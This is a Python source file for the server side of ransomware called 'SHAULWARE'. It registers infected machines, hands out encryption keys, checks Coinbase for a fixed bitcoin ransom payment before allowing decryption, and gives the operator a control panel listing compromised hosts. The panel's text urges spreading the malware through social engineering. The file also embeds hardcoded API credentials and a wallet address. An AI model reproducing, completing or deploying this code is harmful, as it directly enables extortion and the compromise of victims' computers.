from socket import *
import select
import rsa
import pickle
from cryptography.fernet import Fernet
import threading
from coinbase.wallet.client import Client

SERVER_ADDRESS = ('0.0.0.0', 17694)
client_list = []
information_list = []
SYMMETRIC_KEY = open("communication_encryption_key.txt", 'rb').read()
my_server_socket = socket(AF_INET, SOCK_STREAM)

my_server_socket.bind(SERVER_ADDRESS)


class Listen(threading.Thread):
    global client_list
    global information_list

    def __init__(self, server_socket, symmetric_key):
        threading.Thread.__init__(self)
        self.server_socket = server_socket
        self.symmetric = symmetric_key

    def run(self):
        while True:
            self.server_socket.listen()
            client_sock, address = self.server_socket.accept()
            client_list.append(client_sock)
            received_data = pickle.loads(client_sock.recv(1024))
            client_public_key = received_data[0]
            information_list.append((received_data[1], address))
            send_key = rsa.encrypt(self.symmetric, client_public_key)
            client_sock.send(pickle.dumps(send_key))


def check_payment(transaction_id):
    api_key = 'ixhbHrVaDtbmlQQJ'
    api_secret = 'bwlPbxI86g8BSnp7TKb6eFMW47n40B92'
    account_id = "ce4c1a1f-65a4-5098-b6ac-b2f0f16f603f"
    my_address = "37fRiWcuXADrjukfXu2eaQ5k4RP99sp4Bv"
    # ["to"]["address"]
    client = Client(api_key, api_secret)
    print("sent the api request")
    transaction = client.get_transaction(account_id, transaction_id)
    can_decrypt = transaction["amount"]["amount"] == "-0.00041194" and transaction["to"]["address"] == my_address
    print("finished the request")
    return can_decrypt


class Communicate(threading.Thread):
    global information_list
    global client_list

    def __init__(self, server_socket, symmetric_key):
        threading.Thread.__init__(self)
        self.server_socket = server_socket
        self.fernet = Fernet(symmetric_key)

    def run(self):
        while True:
            if client_list:
                rlist, wlist, xlist = select.select([self.server_socket] + client_list, client_list, [])
                for current_socket in wlist:
                    print("got the shit")
                    data = current_socket.recv(1024)
                    if data:
                        print(data)
                        data = self.fernet.decrypt(data).decode()
                        can_decrypt = check_payment(data)
                        data_tosend = self.fernet.encrypt(pickle.dumps(can_decrypt))
                        current_socket.send(data_tosend)


class ControlPanel(threading.Thread):
    global information_list
    global client_list

    def __int__(self):
        threading.Thread.__init__(self)

    def run(self):
        print("""
                    Hi, Welcome to SHAULWARE administrator interface!
                    for help enter help.
                    """)
        while True:
            command = input("ShaulWare$~")
            if command == "help":
                print("""Available commands are: 
                showlist - shows a list of ip addresses and hostnames of pwned computers
                help - shows help
                -----------------
                More commands coming soon !
                """)
            elif command == "showlist":
                if not information_list:
                    print("""
                    Hmm... No clients pwned yet.. DO YOU EVEN SPREAD THE MALWARE BRO?
                    Start using social engineering to get your victims to download the executable in order to fuck with
                    stupid people!!!!!!
                    """)
                else:
                    for hostname, address in information_list:
                        print(f"{hostname}     |      {address}")
                        print(client_list)


listen = Listen(server_socket=my_server_socket, symmetric_key=SYMMETRIC_KEY)
listen.start()

communicate = Communicate(server_socket=my_server_socket, symmetric_key=SYMMETRIC_KEY)
communicate.start()

control_panel = ControlPanel()
control_panel.start()